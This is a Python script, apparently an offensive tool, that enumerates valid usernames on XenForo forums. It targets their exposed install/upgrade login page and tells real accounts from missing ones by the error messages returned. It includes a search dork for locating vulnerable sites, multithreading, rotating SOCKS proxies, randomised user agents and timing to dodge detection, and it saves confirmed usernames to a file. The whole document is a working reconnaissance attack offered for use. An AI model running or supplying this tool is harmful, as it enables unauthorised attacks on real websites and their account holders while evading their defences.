# site examples:
# https://x.x/install/index.php?upgrade/
# https://x.x/install/index.php?upgrade/login

# if user not exists:
# Запрашиваемый пользователь "admin" не найден.
# The requested user 'admin' could not be found.

# if user exists:
# Неверный пароль. Пожалуйста, попробуйте ещё раз.
# Incorrect password. Please try again.

# dork: intext:Upgrade System Login intext:XenForo inurl:index.php

import time
import random
import requests
import argparse
from colorama import Fore
from multiprocessing import Pool, freeze_support, Manager

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--threads", help="number of threads (5)", type=int, default=5)
parser.add_argument("-p", "--proxy", help="enables proxy", action='store_true')
parser.add_argument("-u", "--url", help="url (https://x.x/install/index.php?upgrade/)", type=str, required=True)

args = parser.parse_args()

ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
      'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)']


def brute(username):
    error = "Cannot connect to proxy"
    while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
        try:
            headers = {
                'User-agent': random.choice(ua),
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive'}

            data = {
                'login': username,
                'password': 'password',
                'redirect': '/install/index.php?upgrade/login',
                '_xfConfirm': '1',
                '_xfToken': ""}

            if args.proxy:
                p = random.choice(proxy_list)
                proxies = {
                    "https": "socks5h://" + str(p),
                    "http": "socks5h://" + str(p)}
                send = requests.post(args.url, data=data, headers=headers, proxies=proxies)
            else:
                send = requests.post(args.url, data=data, headers=headers)

            time.sleep(random.choice([number for number in range(4)]))

            if r"Неверный пароль. Пожалуйста, попробуйте ещё раз." in send.text or r"Incorrect password. Please try again." in send.text:
                print(Fore.GREEN + "[*] Username found: " + username)
                file = open("found.txt", "a")
                file.write("site: " + str(args.url) + "\tusername: " + str(username))
                file.close()
            elif r"Запрашиваемый пользователь " in send.text or r"The requested user" in send.text:
                print(Fore.RED + "Username " + username + " not found!")
            elif r"CAPTCHA" in send.text:
                print(Fore.YELLOW + "Captcha triggered!")
            else:
                print(Fore.RED + "There maybe error!")

            error = None
        except Exception as ex:
            if "Cannot connect to proxy" in str(ex) or "Max retries exceeded" in str(ex):
                pass
            else:
                print(Fore.YELLOW + "\n" + str(ex) + "\n")
            error = str(ex)


if __name__ == '__main__':
    m = Manager()

    # https://github.com/danielmiessler/SecLists/tree/master/Usernames
    # user1
    # admin
    # and so on
    user_list = m.list()
    try:
        with open("users.txt", "r") as f:
            for name in f.readlines():
                if name.split("\n")[0] not in user_list:
                    user_list.append(name.split("\n")[0])
    except Exception as exc:
        print(Fore.RED + "Error: " + str(exc))
        exit(0)

    # https://spys.one/en/socks-proxy-list/
    # 192.111.129.150:4145
    # 103.124.92.216:1080
    # and so on
    proxy_list = m.list()
    if args.proxy:
        try:
            with open("proxy.txt", "r") as f:
                for proxy in f.readlines():
                    if proxy.split("\n")[0] not in proxy_list:
                        proxy_list.append(proxy.split("\n")[0])
        except Exception as exc:
            print(Fore.RED + "Error: " + str(exc))
            exit(0)

    freeze_support()
    pool = Pool(args.threads)
    pool.map(brute, user_list)
    pool.close()
    pool.join()
